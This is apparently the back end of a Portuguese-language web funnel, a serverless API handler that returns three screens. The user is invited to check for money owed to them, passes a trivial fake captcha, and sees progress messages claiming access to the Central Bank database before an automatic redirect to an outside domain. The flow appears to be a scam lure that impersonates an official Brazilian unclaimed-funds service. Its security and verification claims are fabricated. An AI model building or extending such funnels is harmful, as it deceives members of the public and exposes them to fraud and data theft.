export default function handler(req, res) {
  // Configurar CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Pegar o ID da query
  const { id } = req.query;
  const stepId = parseInt(id) || 1;

  // Dados dos steps
  const steps = {
    1: {
      success: true,
      sessionId: "quiz_" + Date.now() + "_" + Math.random().toString(36).substring(2, 15),
      step: {
        id: 1,
        type: "welcome",
        title: "Bem-vindo(a) ao Portal de Atendimento!",
        description: "Clique no botão abaixo para verificar se possui Valores Disponíveis.",
        button: {
          text: "VERIFICAR VALORES A RECEBER",
          action: "next"
        },
        icon: "check-circle",
        iconColor: "green"
      }
    },
    2: {
      success: true,
      step: {
        id: 2,
        type: "captcha",
        title: "🤖 Confirme que você não é um robô",
        description: "",
        question: "Digite o número 47 abaixo:",
        input: {
          type: "number",
          placeholder: "Digite aqui",
          label: "",
          required: true,
          validation: {
            min: 1,
            max: 999
          }
        },
        button: {
          text: "VERIFICAR",
          action: "submit"
        },
        icon: "shield",
        iconColor: "blue",
        helpText: ""
      }
    },
    3: {
      success: true,
      step: {
        id: 3,
        type: "loading",
        title: "✅ Verificação Aprovada!",
        description: "Você será redirecionado para o ambiente seguro da consulta.",
        loadingText: "Aguarde alguns segundos...",
        progressSteps: [
          "🔒 Verificação de segurança concluída",
          "📊 Acessando base de dados do Banco Central",
          "🔄 Transferindo parâmetros de rastreamento",
          "✅ Redirecionando para consulta..."
        ],
        autoRedirect: true,
        redirectDelay: 3000,
        icon: "loader",
        iconColor: "green"
      },
      userData: {
        verified: true
      },
      redirectUrl: "https://brasadicas.online/vlr-g/"
    }
  };

  // Verificar se o step existe
  if (!steps[stepId]) {
    return res.status(400).json({
      success: false,
      error: "ID inválido"
    });
  }

  // Retornar o step
  res.status(200).json(steps[stepId]);
}






